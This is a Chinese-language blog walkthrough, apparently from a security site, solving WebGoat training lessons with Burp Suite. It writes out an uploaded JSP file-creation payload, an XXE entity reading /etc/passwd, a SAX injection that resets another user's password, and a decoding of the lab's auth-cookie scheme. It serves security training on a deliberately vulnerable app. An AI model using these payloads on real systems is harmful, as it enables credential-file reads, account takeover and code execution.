+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068464878750.png" src="images/20171001/15068464878750.png" width="554" height="171" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068464878750.png" width="554" height="171" /></p></noscript>
+<h1>Malicious Execution（恶意执行）</h1>
+<h2>Malicious File Execution（恶意文件执行）</h2>
+</p>
+<pre><code>&lt;HTML&gt;
+
+&lt;% java.io.File file= newjava.io.File("/.extract/webapps/WebGoat/mfe_target/webgoat.txt");file.createNewFile();%&gt;
+
+&lt;/HTML&gt;<br /></code></pre>
+<p></p>
+<p><span style="font-size:10.5pt;"></span></p>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+<p>保存成jsp上传</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846494645.png" src="images/20171001/1506846494645.png" width="554" height="220" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846494645.png" width="554" height="220" /></p></noscript>
+<p><a href="http://192.168.8.89:8080/WebGoat/uploads/1.jsp">http://192.168.8.89:8080/WebGoat/uploads/1.jsp</a>，再刷新一下浏览器即可</p>
+<h1>Parameter Tampering（参数修改）</h1>
+<h2>Bypass HTML Field Restrictions</h2>
+<p>将表单启用，再使用burpsuit抓包，随便修改6个参数内容</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465055024.png" src="images/20171001/15068465055024.png" width="554" height="298" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465055024.png" width="554" height="298" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846511363.png" src="images/20171001/1506846511363.png" width="554" height="128" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846511363.png" width="554" height="128" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465142091.png" src="images/20171001/15068465142091.png" width="554" height="216" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465142091.png" width="554" height="216" /></p></noscript>
+<h2>XML External Entity (XXE)</h2>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+
+ &lt;DOCTYPE Header [&lt;ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+
+&lt;searchForm&gt; &lt;from&gt;&amp;xxe;&lt;/from&gt;&lt;/searchForm&gt;<br /></code></pre>
+<p></p>
+<p><span style="font-size:10.5pt;"></span></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465268607.png" src="images/20171001/15068465268607.png" width="554" height="197" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465268607.png" width="554" height="197" /></p></noscript>
+<p></p>
+<h2>Exploit Hidden Fields（利用隐藏的字段）</h2>
+<p>简单来说，就是改了前端的值</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465318492.png" src="images/20171001/15068465318492.png" width="554" height="268" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465318492.png" width="554" height="268" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465383816.png" src="images/20171001/15068465383816.png" width="554" height="94" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465383816.png" width="554" height="94" /></p></noscript>
+<p> </p>
+<h2>Exploit Unchecked Email</h2>
+<p>此表格是客户支持页面的示例。 使用下面的表单尝试：</p>
+<p>1）向网站admin发送恶意脚本。</p>
+<p>2）从OWASP向“朋友”发送恶意脚本。</p>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465454619.png" src="images/20171001/15068465454619.png" width="554" height="372" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465454619.png" width="554" height="372" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465493162.png" src="images/20171001/15068465493162.png" width="554" height="172" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465493162.png" width="554" height="172" /></p></noscript>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465547865.png" src="images/20171001/15068465547865.png" width="554" height="331" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465547865.png" width="554" height="331" /></p></noscript>
+<p> </p>
+<h2>Bypass Client Side JavaScript Validation</h2>
+<p>该网站执行客户端和服务器端验证。 对于此练习，您的工作是打破客户端验证并发送不期望的网站输入。 您必须同时打破所有7个验证器。    </p>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465688850.png" src="images/20171001/15068465688850.png" width="554" height="283" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465688850.png" width="554" height="283" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465723353.png" src="images/20171001/15068465723353.png" width="554" height="361" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465723353.png" width="554" height="361" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465763339.png" src="images/20171001/15068465763339.png" width="554" height="282" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465763339.png" width="554" height="282" /></p></noscript>
+<p></p>
+<h1>Session Management Flaws</h1>
+<h2>Hijack a Session（点击劫持）</h2>
+<p>参考视频：<a href="https://www.youtube.com/watch?v=FA5FjjV4L7Y">https://www.youtube.com/watch?v=FA5FjjV4L7Y</a></p>
+<p><span style="color:rgb(54,54,54);">Cookie</span><span style="color:rgb(54,54,54);">里面的</span><span style="color:rgb(54,54,54);">WEAKID</span><span style="color:rgb(54,54,54);">这个参数是会话标识。我们知道如果客户端发送给</span><span style="color:rgb(54,54,54);">Web</span>    <span style="color:rgb(54,54,54);">服务器的请求里面没有会话标识的话，服务器会从新生成一个新的会话标识并通过</span><span style="color:rgb(54,54,54);">Cookie</span><span style="color:rgb(54,54,54);">返回给客户端</span></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465869878.png" src="images/20171001/15068465869878.png" width="554" height="212" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465869878.png" width="554" height="212" /></p></noscript>
+<p>发送数据包到sequencer选项</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465895692.png" src="images/20171001/15068465895692.png" width="554" height="149" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465895692.png" width="554" height="149" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465937592.png" src="images/20171001/15068465937592.png" width="423" height="157" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465937592.png" width="423" height="157" /></p></noscript>
+<p>由于burpsuite的fuzz不到cookie的位置，故显示不了效果，具体的可以参照视频。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068465966936.png" src="images/20171001/15068465966936.png" width="554" height="362" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068465966936.png" width="554" height="362" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466005745.png" src="images/20171001/15068466005745.png" width="554" height="279" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466005745.png" width="554" height="279" /></p></noscript>
+<p></p>
+<p> <span style="color:rgb(38,38,38);font-size:18px;">Spoof an Authentication Cookie（欺骗认证Cookie）</span></p>
+<p>Webgoat:AuthCookie=65432ubphcfx</p>
+<p>Aspect:AuthCookie=65432udfqtb</p>
+<p>alice用户的cookie是65432，ecilaèfdjmb</p>
+<p>分析cookie，64532是不变的，后面的字符串是经历逆转字符串，然后往后推一位</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466116884.png" src="images/20171001/15068466116884.png" width="554" height="179" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466116884.png" width="554" height="179" /></p></noscript>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846617370.png" src="images/20171001/1506846617370.png" width="554" height="150" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846617370.png" width="554" height="150" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846621138.png" src="images/20171001/1506846621138.png" width="554" height="155" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846621138.png" width="554" height="155" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466261242.png" src="images/20171001/15068466261242.png" width="554" height="126" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466261242.png" width="554" height="126" /></p></noscript>
+<p> </p>
+<h2>Session Fixation（会话固定）</h2>
+<p>在网站后面添加&amp;SID=45</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466341270.png" src="images/20171001/15068466341270.png" width="554" height="312" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466341270.png" width="554" height="312" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466374758.png" src="images/20171001/15068466374758.png" width="554" height="240" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466374758.png" width="554" height="240" /></p></noscript>
+<p>按照提示输入用户名和密码</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466446281.png" src="images/20171001/15068466446281.png" width="554" height="144" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466446281.png" width="554" height="144" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846647669.png" src="images/20171001/1506846647669.png" width="554" height="165" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846647669.png" width="554" height="165" /></p></noscript>
+<p>第四步，直接打开192.168.8.89:8080/WebGoat/start.mvc#attack/2007866518/1800&amp;SID=45</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846655853.png" src="images/20171001/1506846655853.png" width="554" height="184" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846655853.png" width="554" height="184" /></p></noscript>
+<h1>Web Services</h1>
+<h2>Create a SOAP Request</h2>
+<p>Web服务通过使用SOAP请求进行通信。 这些请求被提交给Web服务，试图执行在Web服务定义语言（WSDL）中定义的功能。 让我们来了解一些关于WSDL文件的内容。 查看WebGoat的Web服务描述语言（WSDL）文件。</p>
+<p>一般目标：</p>
+<p>尝试使用浏览器或Web Service工具连接到WSDL。 Web服务的URL是：<a href="http://localhost/WebGoat/services/SoapRequest">http://localhost/WebGoat/services/SoapRequest</a>通常可以在Web服务请求的末尾添加一个WSDL来查看WSDL。 您必须访问2个操作才能通过本课程。</p>
+<p>拦截请求并通过发送有效的帐户的有效SOAP请求来调用任何方法。</p>
+<p>您必须至少访问2个方法来传递课程。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466668566.png" src="images/20171001/15068466668566.png" width="554" height="95" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466668566.png" width="554" height="95" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466691901.png" src="images/20171001/15068466691901.png" width="554" height="108" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466691901.png" width="554" height="108" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/1506846672989.png" src="images/20171001/1506846672989.png" width="554" height="189" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/1506846672989.png" width="554" height="189" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466765195.png" src="images/20171001/15068466765195.png" width="554" height="96" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466765195.png" width="554" height="96" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466796149.png" src="images/20171001/15068466796149.png" width="554" height="288" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466796149.png" width="554" height="288" /></p></noscript>
+<p>使用burpsuit的wsdler插件分析SOAP，但是测试发现无法完成该课程，思路是对的，只是它的验证方法可能与我不对。</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466852278.png" src="images/20171001/15068466852278.png" width="554" height="173" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466852278.png" width="554" height="173" /></p></noscript>
+<h2>WSDL Scanning</h2>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466954481.png" src="images/20171001/15068466954481.png" width="554" height="194" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466954481.png" width="554" height="194" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068466982319.png" src="images/20171001/15068466982319.png" width="554" height="163" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068466982319.png" width="554" height="163" /></p></noscript>
+<p>修改参数内容</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068467023240.png" src="images/20171001/15068467023240.png" width="554" height="218" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068467023240.png" width="554" height="218" /></p></noscript>
+<h2>Web Service SAX Injection</h2>
+<div class="simditor-table">
+<div class="simditor-resize-handle"></div>
+</div>
+<p>Web服务通过使用SOAP请求进行通信。 这些请求被提交给Web服务，以尝试执行在Web服务定义语言（WSDL）文件中定义的功能。</p>
+<p>一般目标：</p>
+<p>一些Web界面在后台使用Web服务。 如果前端依赖于Web服务进行所有输入验证，则可能会破坏Web界面发送的XML。</p>
+<p>在本练习中，尝试更改101以外的用户的密码。</p>
+<p>在输入框输入下面内容</p>
+<p><span style="font-size:12pt;"></span></p>
+<pre><code>&lt;id xsi:type='xsd:int'&gt;102&lt;/id&gt;
+
+&lt;password xsi:type='xsd:string'&gt;P@$$w0rd?&lt;/password&gt;<br /></code></pre>
+<p></p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068467094893.png" src="images/20171001/15068467094893.png" width="554" height="283" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068467094893.png" width="554" height="283" /></p></noscript>
+<h2>Web Service SQL Injection</h2>
+<p>使用burpsuit的插件wsdler</p>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068467148297.png" src="images/20171001/15068467148297.png" width="554" height="327" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068467148297.png" width="554" height="327" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068467185110.png" src="images/20171001/15068467185110.png" width="554" height="257" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068467185110.png" width="554" height="257" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068467265400.png" src="images/20171001/15068467265400.png" width="554" height="290" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068467265400.png" width="554" height="290" /></p></noscript>
+<p><img alt="Clipboard Image.png" data-original="images/20171001/15068507643635.png" src="images/20171001/15068507643635.png" width="554" height="201" /></p>
+<noscript><img alt="Clipboard Image.png" src="images/20171001/15068507643635.png" width="554" height="201" /></p></noscript>
+                                
+                                <div class="column-support">
+                                    <p class="support-mount good_num">4</p>
+                                    <a href="javascript:void (0);" data-status="0" data-id="149807" class="good"></a>
+                                </div>
+                                <script>
+                                    $('.good').on('click',function () {
+                                        var login = $(this).attr('data-status');
+                                        if(login){
+                                            var token = $('#token').val();
+                                            var id = $(this).attr('data-id');
+                                            var good = $('.good_num').text();
+                                            var _this = $(this);
+                                            var _url = document.location.href;
+                                            $.ajax({
+                                                type: "post",
+                                                url: _url,
+                                                data: {'token':token,'id':id, 'good':1},
+                                                success: function (data) {
+                                                    $('#token').val(data.token);
+                                                    if(data.code ==400){
+                                                        layer.open({
+                                                            title: '系统提示',
+                                                            btnAlign: 'c',
+                                                            content: data.msg,
+                                                            area: '278px',
+                                                        });
+                                                    }else {
+                                                        if(good){
+                                                            good++;
+                                                        }else {
+                                                            good=1;
+                                                        }
+                                                        $('.good_num').text(good);
+                                                        _this.disabled();
+                                                    }
+                                                },
+                                            })
+                                        }else {
+                                            layer.open({
+                                                title: '系统提示',
+                                                btnAlign: 'c',
+                                                content: '请先登录',
+                                                btn: ['登录'],
+                                                area: '278px',
+                                                yes: function () {
+                                                    login();
+                                                },
+                                            });
+                                        }
+                                        return false;
+                                    })
+                                    function login(){
+                                        window.location.href = 'https//www.freebuf.com/oauth';
+                                    }
+                                </script>
+                                                    </div>
+                        <div class="wechatcodeDiv">
